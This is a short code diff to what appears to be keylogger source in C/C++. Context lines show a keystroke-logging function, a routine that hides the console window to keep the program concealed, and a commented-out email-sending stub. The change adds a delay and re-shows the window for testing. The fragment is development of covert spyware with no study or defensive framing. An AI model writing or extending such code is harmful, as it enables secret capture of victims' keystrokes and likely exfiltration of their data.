@@ -8,6 +8,7 @@
 #include "main.h"
 
 #pragma warning(disable : 4996)
+
 //^this disables the error message about the key saving method not being safe
 
 void logfile(int key)
@@ -28,6 +29,10 @@ void hideconsole()
 {
 	ShowWindow(GetConsoleWindow(), 0);
 	//hides the console window to keep the application hidden
+	Sleep(1000);//mill seconds
+	ShowWindow(GetConsoleWindow(), 1);// test purporses 
+
+
 }
 
 /*void emailSender(std::string sender, std::fstream file, bool result)
